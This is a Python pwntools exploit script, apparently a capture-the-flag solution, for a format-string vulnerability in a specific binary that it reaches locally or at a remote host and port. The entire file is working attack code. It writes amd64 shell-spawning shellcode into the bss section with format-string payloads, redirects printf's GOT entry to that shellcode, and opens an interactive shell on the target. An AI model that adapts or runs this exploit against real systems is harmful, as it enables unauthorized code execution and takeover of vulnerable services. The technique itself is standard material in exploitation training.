import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###

bss_writable = 0x0000000000601060

printf_got = 0x601028
exit_got = 0x601038

###main###
def main():
    ###payload###
    context.arch = 'amd64'
    shellcode = asm(shellcraft.amd64.linux.sh())

    for i in range(len(shellcode) // 4):
        writes = {}
        writes[bss_writable + 0x200 + 0x4 * i] = shellcode[i * 4: (i + 1) * 4]
        payload = fmtstr_payload(6, writes, numbwritten=0)
        print("[*]writes fmt payload is ...")
        print(writes)

        _ = target.recvuntil("> ")
        target.sendline(payload)
    
    writes = {}
    writes[printf_got] = p64(bss_writable + 0x200)#[:4]
    payload = fmtstr_payload(6, writes, numbwritten=0)
    print("[*]writes printf got ...")
    print(writes)

    _ = target.recvuntil("> ")
    target.sendline(payload)

    # writes = {}
    # writes[printf_got + 0x4] = p64(bss_writable + 0x200)[4:8]
    # payload = fmtstr_payload(6, writes, numbwritten=0)
    # print("[*]writes printf got ...")
    # print(writes)
    # _ = target.recvuntil("> ")
    # target.sendline(payload)
    #_ = target.recvline()

    target.interactive()


if __name__ == "__main__":
    main()